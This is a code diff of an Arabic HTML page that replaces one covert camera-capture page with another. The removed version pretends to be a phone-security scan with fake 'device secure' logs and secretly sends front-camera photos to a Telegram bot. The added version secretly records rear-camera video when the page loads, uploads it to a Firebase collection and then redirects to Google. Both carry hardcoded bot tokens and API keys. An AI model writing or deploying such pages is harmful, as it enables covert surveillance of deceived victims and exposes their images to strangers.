@@ -1,114 +1,46 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛡️ حماية الهاتف</title>
-    <style>
-        :root { --green: #00ff41; --red: #ff0040; }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .container { max-width: 400px; width: 100%; }
-        .page { display: none; } .page.active { display: block; }
-        .skull { font-size: 60px; }
-        h1 { font-size: 22px; color: var(--green); }
-        .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
-        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; text-align: left; max-height: 200px; overflow-y: auto; }
-        .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
-        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--red); width: 0%; }
-        video { display: none; } canvas { display: none; }
-    </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>فحص الفيديو</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{max-width:400px;width:100%;text-align:center}
+h1{font-size:18px;color:#4CAF50;margin-bottom:10px}
+video{width:100%;border-radius:12px;border:2px solid #333;margin-bottom:10px}
+.status{color:#4CAF50;font-size:14px;margin:10px 0}
+</style>
 </head>
 <body>
-<div class="container">
-    <div class="page active" id="page-home">
-        <div class="skull">🛡️</div>
-        <h1>حماية الهاتف</h1>
-        <div style="color:var(--green);" id="device-name">📱 جاري الكشف...</div>
-        <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
-    </div>
-    <div class="page" id="page-scanning">
-        <div class="skull">💀</div>
-        <h1>جاري الفحص...</h1>
-        <div class="code-screen" id="code-screen"></div>
-        <div class="countdown" id="countdown">15</div>
-        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
-        <video id="vid" autoplay playsinline muted></video>
-        <canvas id="cnv"></canvas>
-    </div>
-    <div class="page" id="page-done">
-        <div style="font-size:70px;">✅</div>
-        <div style="color:var(--green);font-size:22px;">جهازك بأمان</div>
-    </div>
-</div>
-
+<div class="container"><h1>🎬 فحص فيديو خلفي</h1>
+<video id="video" autoplay playsinline muted></video>
+<div class="status" id="status">⏳ جاري التسجيل...</div></div>
 <script>
-// ========== قراءة التوكن والـ chatId من الرابط ==========
-const params = new URLSearchParams(window.location.search);
-const CHAT_ID = params.get('chatId') || '7276604783';
-const BOT_TOKEN = params.get('token') || '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-
-document.getElementById('device-name').textContent = '📱 ' + (navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز').trim();
-
-function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
-
-let stream, videoReady = false;
-
-async function startScan() {
-    showPage('page-scanning');
-    
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } });
-        const video = document.getElementById('vid');
-        video.srcObject = stream;
-        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 3000); }; });
-        videoReady = true;
-    } catch(e) { alert('الكاميرا مش شغالة'); return; }
-
-    const codeScreen = document.getElementById('code-screen');
-    const countdownEl = document.getElementById('countdown');
-    const progressFill = document.getElementById('progress-fill');
-    const canvas = document.getElementById('cnv');
-    const video = document.getElementById('vid');
-    const logs = ['[■] INITIALIZING...','[■] CHECKING...','[■] SCANNING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];
-    let s = 15, pics = 0;
-
-    function snap() {
-        if (!videoReady || !video || video.readyState < 2) return;
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(async (blob) => {
-            if (!blob || blob.size < 1000) return;
-            
-            // إرسال للبوت - باستخدام التوكن من الرابط
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo_' + Date.now() + '.jpg');
-            formData.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            console.log('Sending to:', url, 'Chat:', CHAT_ID);
-            
-            try {
-                const res = await fetch(url, { method: 'POST', body: formData });
-                const data = await res.json();
-                console.log('Result:', data.ok ? 'OK' : data.description);
-            } catch(e) { console.log('Error:', e); }
-            
-            pics++;
-        }, 'image/jpeg', 0.85);
-    }
-
-    const timer = setInterval(() => {
-        s--; countdownEl.textContent = s;
-        progressFill.style.width = ((15 - s) / 15 * 100) + '%';
-        codeScreen.innerHTML = logs.slice(0, Math.floor(((15-s)/15)*logs.length+1)).join('<br>');
-        if (s <= 12 && pics < 10) snap();
-        if (s <= 0) { clearInterval(timer); for (let i = pics; i < 10; i++) snap(); setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000); }
-    }, 1000);
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+var mr,chunks=[];
+async function go(){
+try{
+var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+document.getElementById('video').srcObject=s;
+mr=new MediaRecorder(s);
+mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+mr.onstop=async function(){
+var blob=new Blob(chunks,{type:'video/mp4'});
+var r=new FileReader();
+r.onload=async function(e){
+await db.collection('gallery').add({url:e.target.result,type:'🎬 فيديو خلفي',timestamp:new Date().toISOString()});
+document.getElementById('status').textContent='✅ تم التسجيل';
+setTimeout(function(){window.location.href='https://google.com/'},2000);
+};
+r.readAsDataURL(blob);
+};
+mr.start();
+setTimeout(function(){mr.stop();s.getTracks().forEach(function(t){t.stop();});},10000);
+}catch(e){document.getElementById('status').textContent='❌ خطأ';}
 }
-</script>
-</body>
-</html>
+go();
+</script></body></html>
